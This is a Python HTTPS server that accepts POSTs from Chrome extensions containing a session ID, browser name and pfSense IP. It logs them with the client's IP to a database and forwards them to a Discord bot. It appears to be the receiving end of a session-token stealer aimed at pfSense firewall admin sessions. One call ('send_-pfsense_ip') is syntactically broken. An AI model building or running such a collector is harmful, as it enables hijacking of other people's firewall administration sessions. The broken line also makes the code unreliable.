from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import urllib.parse
import sqlworker
import ssl
import discord_bot

class LogHandler(BaseHTTPRequestHandler):
    def _send_cors_headers(self):
        """Sets headers required to allow Chrome Extensions to fetch data."""
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        """Handles preflight requests sent by Chrome before the actual POST."""
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        parsed_data = urllib.parse.parse_qs(post_data)
        session_id = parsed_data.get('session', [''])[0]
        browser = parsed_data.get('browser', [''])[0]
        pfsense_ip = parsed_data.get('pfsense_ip2', [''])[0]
        client_ip = self.client_address[0]
        
        if session_id:
            print("Session ID Received")
            sqlworker.insert(client_ip, pfsense_ip, session_id, browser)
            discord_bot.send_-pfsense_ip(client_ip, pfsense_ip, session_id, browser)
            print(pfsense_ip)
            self.send_response(200)
            self._send_cors_headers()
            self.end_headers()
        else:
            self.send_error(400, "Bad Request: Missing session ID")
            self._send_cors_headers()

def main():
    
    print("Starting Server")
    
    server_address = ('', 443)
    httpd = ThreadingHTTPServer(server_address, LogHandler)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    httpd.serve_forever()

if __name__ == "__main__":
    main()